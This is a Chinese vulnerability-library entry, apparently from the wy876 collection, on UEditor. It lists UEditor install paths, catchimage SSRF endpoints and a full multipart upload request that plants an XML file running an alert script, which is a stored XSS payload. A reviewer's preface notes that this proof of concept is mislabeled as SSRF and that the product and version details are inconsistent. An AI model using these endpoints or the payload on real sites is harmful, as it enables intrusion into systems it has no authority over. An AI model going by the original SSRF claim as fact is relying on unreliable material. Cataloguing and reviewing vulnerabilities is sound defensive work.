---
source: "wy876 漏洞文库"
product: "UEditor / 远程抓图及XML上传"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ueditor存在SSRF漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：影响版本空白，NET目录示例却列JSP/PHP SSRF"
side_effects: "未执行；本文需注意的操作影响：JSP“SSRF”PoC实际是XML存储XSS；POST action=uploadfile，文件1.xml含alert脚本，没有任何服务端外连目标"
source_status: "unknown"
id: "vw-56146e8b79576f90c85a69e5"
entity_id: "ve-56146e8b79576f90c85a69e5"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：影响版本空白，NET目录示例却列JSP/PHP SSRF

代码与实验材料：PHP仅source占位，JSP完整multipart实际上传XML-XSS

来源证据范围：语雀原文及wy876来源

- **证据待核（1）**：JSP“SSRF”PoC实际是XML存储XSS；依据：POST action=uploadfile，文件1.xml含alert脚本，没有任何服务端外连目标。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：产品分支信息混乱；依据：列.NET路径、用JSP请求和PHP source，缺版本/认证及完整Host。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（3）**：来源里主体需拆实体；依据：不能以Web请求形式相似把SSRF和XSS合成一个漏洞。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ueditor存在SSRF漏洞

### 一、漏洞描述
ueditor存在SSRF漏洞

### 二、影响版本


### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

SSRF路径

```plain
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```

PHP版本：

```plain
/ueditor/php/controller.php?action=catchimage&source[]=x.x.x
```


JSP版本：

```plain
POST /ueditor/jsp/controller.jsp?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Length: 323


------WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Disposition: form-data; name="upfile"; filename="1.xml"
Content-Type: image/png

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
------WebKitFormBoundarynJAiy5Qly8XpmZmQ--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nvizlic3zcdfd5rg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
